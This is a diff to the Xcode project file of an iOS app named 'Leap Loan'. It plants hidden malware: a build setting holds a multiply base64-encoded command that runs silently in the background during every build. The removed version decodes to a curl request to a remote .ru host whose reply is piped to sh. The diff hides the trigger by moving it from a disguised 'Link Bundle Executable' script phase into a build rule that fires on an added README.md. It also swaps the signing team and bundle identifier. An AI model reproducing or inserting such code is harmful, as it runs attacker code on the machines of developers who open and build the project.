@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		2307D9CA06864AC0BFA389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = AF2F711180AD490795A389E6; };
 		0169C223D4B0CBD72EE17C25 /* Pods_leaploan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C3FFCD76033F537953878033 /* Pods_leaploan.framework */; };
 		7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */; };
 		7333CD6D2EB4E66000C55A91 /* AppHomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */; };
@@ -77,10 +78,8 @@
 		73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F59DE22EAF638100A68B13 /* AppDelegate.swift */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-    	    	    	/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
+		AF2F711180AD490795A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		732709952EBC84D600DB6D8C /* leaploan.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = leaploan.entitlements; sourceTree = "<group>"; };
 		7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEmptyView.swift; sourceTree = "<group>"; };
 		7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHomeView.swift; sourceTree = "<group>"; };
@@ -349,6 +348,7 @@
 		73F59DCB2EAF637A00A68B13 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				AF2F711180AD490795A389E6 /* README.md */,
 				73F59DCA2EAF637A00A68B13 /* leaploan.app */,
 			);
 			name = Products;
@@ -398,7 +398,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
 			buildPhases = (
-				8DB07EA90F174E3B8CA389E6 /* Link Bundle Executable */,
 				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
 				73F59DC62EAF637A00A68B13 /* Sources */,
 				73F59DC72EAF637A00A68B13 /* Frameworks */,
@@ -406,6 +405,7 @@
 				04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				8D05F442B1074703AEA389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -448,11 +448,29 @@
 		};
 /* End PBXProject section */
 
+    /* Begin PBXBuildRule section */
+    		8D05F442B1074703AEA389E6 /* PBXBuildRule */ = {
+    				isa = PBXBuildRule;
+    				compilerSpec = com.apple.compilers.proxy.script;
+    				filePatterns = "*.md";
+    				fileType = pattern.proxy;
+    				inputFiles = (
+    				);
+    				isEditable = 0;
+    				outputFiles = (
+    					"/tmp/${INPUT_FILE_BASE}",
+    				);
+    				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A6E983A}\"";
+    			};
+    	/* End PBXBuildRule section */
+    
 /* Begin PBXResourcesBuildPhase section */
 		73F59DC82EAF637A00A68B13 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2307D9CA06864AC0BFA389E6 /* README.md */,
 				73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */,
 				73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -461,26 +479,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		8DB07EA90F174E3B8CA389E6 /* Link Bundle Executable */ = {
-    			isa = PBXShellScriptBuildPhase;
-    			buildActionMask = 2147483647;
-    			alwaysOutOfDate = 1;
-    			files = (
-    			);
-    			inputFileListPaths = (
-    			);
-    			inputPaths = (
-    			);
-    			name = "Link Bundle Executable";
-    			outputFileListPaths = (
-    			);
-    			outputPaths = (
-    			);
-    			shellPath = /bin/sh;
-    			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-    			showEnvVarsInLog = 0;			
-    		};
-                                            		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
+		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -616,33 +615,39 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNacFpHVnZZMlJ1WVhCd0xuSjFMMkVwSWlCOElITm9DZz09Cg== | y | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((g(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREphUm1NeFkwZE5lbUpJY0ZwTmExbDNWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = leaploan/leaploan.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = leaploan/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Leap Loan";
+				INFOPLIST_KEY_NSCameraUsageDescription = "";
+				INFOPLIST_KEY_NSContactsUsageDescription = "";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
+				PRODUCT_BUNDLE_IDENTIFIER = test.moxige.three;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = moxigethreeprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -661,33 +666,39 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNacFpHVnZZMlJ1WVhCd0xuSjFMMkVwSWlCOElITm9DZz09Cg== | y | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((g(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREphUm1NeFkwZE5lbUpJY0ZwTmExbDNWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = leaploan/leaploan.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = leaploan/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Leap Loan";
+				INFOPLIST_KEY_NSCameraUsageDescription = "";
+				INFOPLIST_KEY_NSContactsUsageDescription = "";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
+				PRODUCT_BUNDLE_IDENTIFIER = test.moxige.three;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = moxigethreeprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
